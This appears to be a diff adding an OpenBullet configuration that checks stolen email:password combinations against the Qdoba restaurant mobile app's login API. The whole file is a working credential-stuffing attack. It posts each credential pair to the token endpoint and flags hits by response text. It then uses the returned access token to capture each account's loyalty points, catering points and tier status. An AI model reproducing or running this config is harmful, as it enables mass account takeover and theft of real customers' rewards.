@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "QDoba",
+  "SuggestedBots": 10,
+  "LastModified": "2018-12-30T20:48:40.109735+00:00",
+  "AdditionalInfo": "",
+  "Author": "YungChef",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST REQUEST POST "https://prod.qdobamobile.app/api/v1/security/token" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"provider\":\"Local\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.8.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "BR-Client-Platform: Android" 
+  HEADER "Host: prod.qdobamobile.app" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Username not found in database" 
+    KEY "Sorry, those credentials are invalid" 
+  KEYCHAIN Success OR 
+    KEY "accessToken\":\"" 
+#accessToken PARSE "<SOURCE>" JSON "accessToken" Recursive=FALSE -> VAR "accessToken" "" "" 
+#customerId PARSE "<SOURCE>" JSON "customerId" Recursive=FALSE -> VAR "customerId" "" "" 
+#CAPTURE REQUEST GET "https://prod.qdobamobile.app/api/v1/query/affinity/<customerId>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.8.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "BR-Client-Platform: Android" 
+  HEADER "BR-Qdoba-Market: C" 
+  HEADER "Authtoken: <accessToken>" 
+  HEADER "Host: prod.qdobamobile.app" 
+#points PARSE "<SOURCE>" JSON "points" Recursive=FALSE -> CAP "points" "" "" 
+#cateringPoints PARSE "<SOURCE>" JSON "cateringPoints" Recursive=FALSE -> CAP "cateringPoints" "" "" 
+#level PARSE "<SOURCE>" JSON "level" Recursive=FALSE -> CAP "level" "" "" 
+PARSE "<SOURCE>" JSON "isMaxTier" Recursive=FALSE -> CAP "isMaxTier" "" "" 
